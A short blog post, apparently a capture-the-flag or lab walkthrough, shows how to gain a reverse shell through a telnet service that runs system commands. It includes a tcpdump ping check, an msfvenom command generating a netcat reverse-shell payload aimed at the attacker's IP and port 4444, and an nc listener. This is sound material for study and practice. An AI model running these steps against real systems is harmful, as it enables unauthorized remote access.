---
layout: default
title : muzec - Exploiting Telnet To Gain A Reverse Shell
---

![Image](https://imgur.com/XWDCe9o.png)

Let exploit some common vulnerablity in the telnet client and system server let hit it since we have the IP and port let connect to it with `telnet IP PORT` .

![Image](https://imgur.com/2pC4OU7.png)

Now let try to execute some commands.

![Image](https://imgur.com/cBtJMu3.png)

Hmmm we got nothing now let's check to see if what we're typing is being executed as a system command.

Let start up a tcpdump listener on our machine.

`sudo tcpdump ip proto \\icmp -i tun0`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

![Image](https://imgur.com/OPLQgBt.png)

Now let try to ping our IP on the telnet server and check our tcpdump listener.

`.RUN ping Local-IP -c 1`

![Image](https://imgur.com/wzZKY8p.png)

Cool we are able to execute system commands since we are able to ping our local IP now let get reverse shell let generate a reverse shell code with msfvenom.

`msfvenom -p cmd/unix/reverse_netcat lhost=Local-IP lport=4444 R`

![Image](https://imgur.com/gKNDObi.png)

now let start our ncat listener `nc -nvlp 4444` and run the reverse shell code on the telnet client.

![Image](https://imgur.com/I1WSAt3.png)

And we have shell back to our terminal.

![Image](https://imgur.com/0579uEX.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
